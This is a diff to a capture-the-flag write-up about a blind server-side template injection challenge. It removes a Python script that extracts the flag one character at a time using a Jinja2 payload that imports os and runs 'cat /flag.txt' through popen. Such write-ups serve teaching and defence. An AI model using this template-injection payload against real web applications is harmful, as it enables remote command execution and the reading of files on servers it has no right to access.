@@ -21,36 +21,9 @@ Since the challenge was a blind SSTI, I could not directly see the contents of t
 ### 3. Flag Extraction
 
 I automated the extraction process using a Python script and the `requests` library.
-
 The script tested possible characters one by one using a predefined alphabet. For each character, it checked whether the beginning of the flag file matched the current candidate.
-
 If the server returned `MATCH`, the character was added to the flag. This process continued until the closing `}` character was found.
-
 This allowed me to extract the flag character by character without directly displaying the file contents.
-
-import requests
-
-url = "https://teamcheck.web.glacierctf.com"
-endpoint = url + "/check_team"
-
-alphabet = "abcdefghijklmnopqrstuvwxyz0123456789}"
-prefix = "gctf{"
-flag = prefix
-
-for i in range(len(prefix),80):
-     for char in alphabet:
-        candidate = flag + char
-        payload=("{% if lipsum.__globals__.__builtins__.__import__(\'os\').popen(\"cat /flag.txt\").read()[0:"
-        + str(i + 1) + "] == " + repr(candidate)
-        + " %}MATCH{% else %}NO{% endif %}")
-
-        response = requests.get(endpoint,params={"teamname": payload},timeout=10)
-        if "MATCH" in response.text:
-            flag += char
-            print (flag)        
-
-            if char =="}":
-                break
 
 
 ### 4. Root Cause & Mitigation
